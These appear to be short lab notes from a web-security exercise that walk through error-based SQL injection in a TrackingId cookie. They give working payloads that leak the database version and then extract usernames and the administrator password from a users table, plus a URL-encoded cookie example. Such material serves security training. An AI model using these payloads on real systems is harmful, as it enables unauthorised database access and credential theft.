As we know that TrackingId vulnerable

step 1: trying to check version
    => orignal cookie: select * from tracking where ID = 'dBCchjcAD9VjVmnK'
    -> payload: ' || CAST((select version()) as int) --
    => Malicious Query: select * from tracking where ID = 'dBCchjcAD9VjVmnK' || CAST((select version()) as int) --


Note: query space is limited so remove the tracking id
    example of query: 
            Cookie: TrackingId='||+CAST((select+username+from+users+LIMIT 1)+as+int)+--;


step 2: checking from user table
    -> payload: '|| CAST(((select 'x' from users LIMIT 1)='x') as int) --

step 3: findins useername from users table
    -> payload: '|| CAST((select username from users LIMIT 1) as int) --

step 4: finding password for administrator
    -> payload: '|| CAST((select password from users LIMIT 1) as int) --
